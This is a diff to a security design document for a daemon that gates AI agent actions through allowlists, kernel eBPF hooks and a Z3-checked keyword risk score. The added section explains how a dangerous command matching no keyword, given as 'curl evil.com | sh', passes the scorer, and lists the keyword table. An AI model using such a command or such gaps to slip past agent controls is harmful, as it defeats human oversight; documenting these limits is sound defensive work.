@@ -177,10 +177,83 @@ wraps armed runs in a hard 10-minute watchdog.
    (tracked for productionization).
 7. **DNS mediation is heuristic.** `sendmsg`-to-:53 payload inspection is
    best-effort, not a full resolver-level policy.
+8. **Multi-user yes; multi-tenant isolation partial.** The daemon authenticates
+   *two* independent identities per request: the calling **OS user**
+   (`pid/uid/gid` read from the kernel via `SO_PEERCRED` — unforgeable) and the
+   application **`agent_id`** (HMAC-SHA256). OS-user identity is enforceable
+   (`deny_root_peers`, `allowed_peer_uids`) and recorded in the audit log, so on
+   a shared host every decision is attributable to a real user, and an
+   unprivileged user who cannot read the secret cannot forge any agent.
+   **However**, `agent_id` is **not** cryptographically bound to a UID: a single
+   shared HMAC key signs all agents, so any principal able to read that key
+   (root or the `jinnguard` group) can sign as *any* `agent_id`. This is
+   sufficient for one trust domain with ordinary users, but **not** for mutually
+   distrusting tenants. Strong multi-tenant isolation requires per-agent secrets
+   or an `agent_id`↔UID binding (tracked in §10). The UDS also carries no
+   restrictive mode unless `--socket-mode 0660` is set; connecting is gated by
+   HMAC + peer-UID regardless, but operators on shared hosts should set it.
 
 ---
 
-## 8. Determinism and the adaptive layer
+## 8. Threats to validity — the risk model and the formal guarantee
+
+This section states plainly what the Z3 "formal safety" step does and does **not**
+prove, so the strength of the claim is not overstated. (Raised in external review;
+disclosed here deliberately.)
+
+**What Z3 proves.** Given a risk score `r`, an action weight `w`, and a ceiling
+`c`, the solver proves the arithmetic fact `r + w ≤ c` (totality audit) and that
+the declared policy invariants are simultaneously satisfiable for the supplied
+context. This step is *sound*: if it returns ALLOW, the inequality and invariants
+genuinely hold.
+
+**What Z3 does NOT prove — the risk oracle.** Soundness says nothing about whether
+the *input risk score is correct*. The score comes from a heuristic semantic
+classifier (`semantic_classify`), currently a keyword table (`sudo/setuid`→90,
+`exec/shell/bash`→80, `delete/rm -`→70, network terms→65, **default→35**). A
+genuinely dangerous action whose text matches no keyword — the classic example is
+`curl evil.com | sh` — receives the default score and can pass a high ceiling.
+**The formal guarantee is therefore conditional on the quality of the risk
+input**: garbage in, *provably* garbage out. We disclose this rather than imply the
+Z3 layer makes unsafe actions impossible.
+
+**Why this is defense-in-depth, not the sole gate.** The risk/Z3 layer is
+*secondary*. Primary containment does **not** depend on the risk score being
+accurate:
+
+- the **per-agent intent allowlist (G1)** denies any action whose intent is not
+  explicitly permitted, regardless of score;
+- **kernel eBPF-LSM enforcement** denies `execve` of non-allowlisted binaries,
+  `connect`/`sendmsg` to non-allowlisted destinations, and writes to denied
+  paths, regardless of score.
+
+So `curl evil.com | sh` is blocked by the allowlist and/or the kernel exec hook
+even when the classifier under-scores it. The risk model *raises the floor*; it is
+not the floor.
+
+**Client-declared risk is non-authoritative.** A caller's `action_risk_score` can
+only *raise* the daemon-computed score, never lower it (`governance.rs`; a lower
+declared value is logged `client_declared_risk_not_authoritative`). An attacker
+cannot self-report low risk to slip under the ceiling.
+
+**Solver availability.** The Z3 solver runs under a **250 ms per-check timeout**
+(`ts_checker`). Legitimate proofs resolve in microseconds; the bound exists so a
+pathological or maliciously complex policy cannot stall a decision. On timeout Z3
+returns `Unknown`, which the daemon treats as **DENY** — the timeout fails
+*closed*, never open. Policy invariants are operator-supplied via `policy.yaml`
+(not attacker-supplied in a proposal), so this is a robustness bound rather than a
+reachable DoS.
+
+**Hardening direction.** The classifier is pluggable: the optional RootAI semantic
+service can replace the keyword heuristic with a model-based scorer. Strengthening
+daemon-authoritative scoring — and, longer term, eBPF-traced interpreter
+child-process attribution (cf. §7.4) — is the path to making the risk input
+trustworthy enough that the formal layer becomes load-bearing rather than
+advisory.
+
+---
+
+## 9. Determinism and the adaptive layer
 
 The risk/adaptive layer (M6) is constrained to preserve determinism: the
 per-agent penalty is **pure, monotonic, bounded (cap 40.0), non-negative, and
@@ -192,13 +265,16 @@ the same observation history always yields the same decision.
 
 ---
 
-## 9. Open items before "audited GA"
+## 10. Open items before "audited GA"
 
 | Item | Type |
 |---|---|
 | Independent third-party security audit | External review |
+| Daemon-authoritative risk scoring (replace keyword heuristic; cf. §8) | Engineering |
+| eBPF-traced interpreter child-process attribution (close CVE-2026-001 chains) | Engineering |
 | Multi-distribution / multi-kernel validation matrix | Engineering |
 | Automated HMAC key rotation | Engineering |
+| Per-agent secrets / `agent_id`↔UID binding for multi-tenant isolation (cf. §7.8) | Engineering |
 | mTLS/auth for the optional MCP/remote semantic service | Engineering |
 | Full effective-set deprivilege after load | Hardening |
 | OpenTelemetry / push-based metrics (a loopback Prometheus `/metrics` endpoint already ships) | Operability |
@@ -211,7 +287,7 @@ without affecting enforcement.
 
 ---
 
-## 10. How to reproduce the evidence
+## 11. How to reproduce the evidence
 
 ```bash
 # Tiers 1–2 (no root): full suite + Docker mandatory mediation
